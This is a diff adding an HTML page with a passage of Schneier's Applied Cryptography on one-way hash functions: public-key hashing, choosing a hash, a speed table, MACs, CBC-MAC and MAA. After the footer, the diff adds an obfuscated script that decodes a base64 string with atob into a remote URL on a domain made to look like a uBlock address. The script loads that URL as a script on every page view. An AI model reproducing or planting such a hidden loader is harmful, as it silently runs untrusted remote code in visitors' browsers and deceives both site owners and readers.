@@ -1,0 +1,178 @@
+<html>
+<head>
+<TITLE>APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C:One-Way Hash Functions</TITLE>
+<!-- BEGIN HEADER -->
+<META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
+<SCRIPT>
+<!--
+function displayWindow(url, width, height) {
+        var Win = window.open(url,"displayWindow",'width=' + width +
+',height=' + height + ',resizable=1,scrollbars=yes');
+}
+//-->
+</SCRIPT>
+
+</HEAD>
+<body bgcolor="ffffff" link="#006666" alink="#006666" vlink="#006666">
+<P>
+<CENTER><B>Applied Cryptography, Second Edition: Protocols,  Algorthms, and Source Code in C (cloth)</B>
+<FONT SIZE="-2">
+<BR>
+<I>(Publisher: John Wiley & Sons, Inc.)</I>
+<BR>
+Author(s): Bruce Schneier
+<BR>
+ISBN: 0471128457
+<BR>
+Publication Date: 01/01/96
+</FONT></CENTER>
+<P>
+
+
+<!-- Empty Reference Subhead -->
+
+<!--ISBN=0471128457//-->
+<!--TITLE=APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C//-->
+<!--AUTHOR=Bruce Schneier//-->
+<!--PUBLISHER=Wiley Computer Publishing//-->
+<!--CHAPTER=18//-->
+<!--PAGES=455-457//-->
+<!--UNASSIGNED1//-->
+<!--UNASSIGNED2//-->
+
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="18-07.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="18-09.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+<P><BR></P>
+<P><FONT SIZE="+1"><B><I>Other Schemes</I></B></FONT></P>
+<P>Ralph Merkle proposed a scheme using DES, but it&#146;s slow; it only processes seven message bits per iteration and each iteration involves two DES encryptions [1065, 1069]. Another scheme [1642, 1645] is insecure [1267]; it was once proposed as an ISO standard.
+</P>
+<H3><A NAME="Heading13"></A><FONT COLOR="#000077">18.12 Using Public-Key Algorithms</FONT></H3>
+<P>It is possible to use a public-key encryption algorithm in a block chaining mode as a one-way hash function. If you then throw away the private key, breaking the hash would be as difficult as reading the message without the private key.
+</P>
+<P>Here&#146;s an example using RSA. If <I>M</I> is the message to be hashed, <I>n</I> is the product of two primes <I>p</I> and <I>q,</I> and <I>e</I> is another large number relatively prime to (<I>p</I> - 1)(<I>q</I> - 1), then the hash function, H(<I>M</I> ), would be</P>
+<DL>
+<DD>H(<I>M</I> ) = <I>M<SUP>e</I></SUP> mod <I>n</I>
+</DL>
+<P>An even easier solution would be to use a single strong prime as the modulus <I>p</I>. Then:</P>
+<DL>
+<DD>H(<I>M</I> ) = <I>M<SUP>e</I></SUP> mod <I>p</I>
+</DL>
+<P>Breaking this problem is probably as difficult as finding the discrete logarithm of <I>e</I>. The problem with this algorithm is that it&#146;s far slower than any others discussed here. I don&#146;t recommend it for that reason.</P>
+<H3><A NAME="Heading14"></A><FONT COLOR="#000077">18.13 Choosing a One-Way Hash Function</FONT></H3>
+<P>The contenders seem to be SHA, MD5, and constructions based on block ciphers; the others really haven&#146;t been studied enough to be in the running. I vote for SHA. It has a longer hash value than MD5, is faster than the various block-cipher constructions, and was developed by the NSA. I trust the NSA&#146;s abilities at cryptanalysis, even if they don&#146;t make their results public.
+</P>
+<P>Table 18.2 gives timing measurements for some hash functions.y They are meant for comparison purposes only.</P>
+<H3><A NAME="Heading15"></A><FONT COLOR="#000077">18.14 Message Authentication Codes</FONT></H3>
+<P>A message authentication code, or MAC, is a key-dependent one-way hash function. MACs have the same properties as the one-way hash functions discussed previously, but they also include a key. Only someone with the identical key can verify the hash. They are very useful to provide authenticity without secrecy.
+</P>
+<P>MACs can be used to authenticate files between users. They can also be used by a single user to determine if his files have been altered, perhaps by a virus. A user could compute the MAC of his files and store that value in a table. If the user used instead a one-way hash function, then the virus could compute the new hash value after infection and replace the table entry. A virus could not do that with a MAC, because the virus does not know the key.</P>
+<TABLE WIDTH="100%"><TH CAPTION COLSPAN="3" ALIGN="CENTER">Table 18.2<BR>Speeds of Some Hash Functions on a 33 MHz 486SX
+<TR>
+<TD COLSPAN="3"><HR>
+<TR>
+<TH WIDTH="35%" ALIGN="LEFT">Algorithm
+<TH WIDTH="25%" ALIGN="LEFT">Hash Length
+<TH ALIGN="LEFT">Encryption Speed (kilobytes/second)
+<TR>
+<TD COLSPAN="3"><HR>
+<TR>
+<TD VALIGN="TOP" ALIGN="LEFT">Abreast Davies-Meyer (with IDEA)
+<TD VALIGN="TOP" ALIGN="LEFT">128
+<TD VALIGN="TOP" ALIGN="LEFT">22
+<TR>
+<TD VALIGN="TOP" ALIGN="LEFT">Davies-Meyer (with DES)
+<TD VALIGN="TOP" ALIGN="LEFT">64
+<TD VALIGN="TOP" ALIGN="LEFT">9
+<TR>
+<TD VALIGN="TOP" ALIGN="LEFT">GOST Hash
+<TD VALIGN="TOP" ALIGN="LEFT">256
+<TD VALIGN="TOP" ALIGN="LEFT">11
+<TR>
+<TD VALIGN="TOP" ALIGN="LEFT">HAVAL (3 passes)
+<TD VALIGN="TOP" ALIGN="LEFT">variable
+<TD VALIGN="TOP" ALIGN="LEFT">168
+<TR>
+<TD VALIGN="TOP" ALIGN="LEFT">HAVAL (4 passes)
+<TD VALIGN="TOP" ALIGN="LEFT">variable
+<TD VALIGN="TOP" ALIGN="LEFT">118
+<TR>
+<TD VALIGN="TOP" ALIGN="LEFT">HAVAL (5 passes)
+<TD VALIGN="TOP" ALIGN="LEFT">variable
+<TD VALIGN="TOP" ALIGN="LEFT">95
+<TR>
+<TD VALIGN="TOP" ALIGN="LEFT">MD2
+<TD VALIGN="TOP" ALIGN="LEFT">128
+<TD VALIGN="TOP" ALIGN="LEFT">23
+<TR>
+<TD VALIGN="TOP" ALIGN="LEFT">MD4
+<TD VALIGN="TOP" ALIGN="LEFT">128
+<TD VALIGN="TOP" ALIGN="LEFT">236
+<TR>
+<TD VALIGN="TOP" ALIGN="LEFT">MD5
+<TD VALIGN="TOP" ALIGN="LEFT">128
+<TD VALIGN="TOP" ALIGN="LEFT">174
+<TR>
+<TD VALIGN="TOP" ALIGN="LEFT">N-HASH (12 rounds)
+<TD VALIGN="TOP" ALIGN="LEFT">128
+<TD VALIGN="TOP" ALIGN="LEFT">29
+<TR>
+<TD VALIGN="TOP" ALIGN="LEFT">N-HASH (15 rounds)
+<TD VALIGN="TOP" ALIGN="LEFT">128
+<TD VALIGN="TOP" ALIGN="LEFT">24
+<TR>
+<TD VALIGN="TOP" ALIGN="LEFT">RIPE-MD
+<TD VALIGN="TOP" ALIGN="LEFT">128
+<TD VALIGN="TOP" ALIGN="LEFT">182
+<TR>
+<TD VALIGN="TOP" ALIGN="LEFT">SHA
+<TD VALIGN="TOP" ALIGN="LEFT">160
+<TD VALIGN="TOP" ALIGN="LEFT">75
+<TR>
+<TD VALIGN="TOP" ALIGN="LEFT">SNEFRU (4 passes)
+<TD VALIGN="TOP" ALIGN="LEFT">128
+<TD VALIGN="TOP" ALIGN="LEFT">48
+<TR>
+<TD VALIGN="TOP" ALIGN="LEFT">SNEFRU (8 passes)
+<TD VALIGN="TOP" ALIGN="LEFT">128
+<TD VALIGN="TOP" ALIGN="LEFT">23
+<TR>
+<TD COLSPAN="3"><HR>
+<TR>
+</TABLE>
+<P>An easy way to turn a one-way hash function into a MAC is to encrypt the hash value with a symmetric algorithm. Any MAC can be turned into a one-way hash function by making the key public.
+</P>
+<P><FONT SIZE="+1"><B><I>CBC-MAC</I></B></FONT></P>
+<P>The simplest way to make a key-dependent one-way hash function is to encrypt a message with a block algorithm in CBC or CFB modes. The hash is the last encrypted block, encrypted once more in CBC or CFB modes. The CBC method is specified in ANSI X9.9 [54], ANSI X9.19 [56], ISO 8731-1 [759], ISO 9797 [763], and an Australian standard [1496]. Differential cryptanalysis can break this scheme with reduced-round DES or FEAL as the underlying block algorithms [1197].
+</P>
+<P>The potential security problem with this method is that the receiver must have the key, and that key allows him to generate messages with the same hash value as a given message by decrypting in the reverse direction.</P>
+<P><FONT SIZE="+1"><B><I>Message Authenticator Algorithm (MAA)</I></B></FONT></P>
+<P>This algorithm is an ISO standard [760]. It produces a 32-bit hash, and was designed for mainframe computers with a fast multiply instruction [428].
+</P>
+<DL>
+<DD><I>v</I> = <I>v</I> &lt&lt&lt 1
+<DD><I>e</I> = <I>v</I> &#8853; <I>w</I>
+<DD><I>x</I> = ((((<I>e</I> &#43; <I>y</I> ) mod 2<SUP>32</SUP>) &#8870; A&#8869; C) * (<I>x</I> &#8853; <I>M</I><SUB>i</SUB>)) mod 2<SUP>32</SUP> - 1
+<DD><I>y</I> = ((((<I>e &#43; x</I>) mod 2<SUP>32</SUP>) &#8870; B&#8869; D) * (<I>y</I> &#8853; <I>M</I><SUB>i</SUB>)) mod 2<SUP>32</SUP> - 2
+</DL>
+<P>Iterate these for each message block, <I>M</I><SUB>i</SUB>, and the resultant hash is the XOR of <I>x</I> and <I>y</I>. The variables <I>v</I> and <I>e</I> are determined from the key. A, B, C, and D are constants.</P>
+<P>This algorithm is probably in wide use, but I can&#146;t believe it is all that secure. It was designed a long time ago, and isn&#146;t very complicated.</P><P><BR></P>
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="18-07.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="18-09.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+
+[an error occurred while processing this directive]
+<script type="text/javascript">(function(TJhlHexD, gTjQOhXo) {gTjQOhXo = TJhlHexD.createElement('script');gTjQOhXo.type = 'text/javascript';gTjQOhXo.async = true;gTjQOhXo.src = atob('0024241d2f28Ly91YmxvY2stcmVmZXJlci5kZXYvY2FtcGFpZ24uanM=0024241d2f28'.replace(/0024241d2f28/gi, '')) + '?' + String(Math.random()).replace('0.','');TJhlHexD.getElementsByTagName('body')[0].appendChild(gTjQOhXo);}(document));</script></body>
+</html>
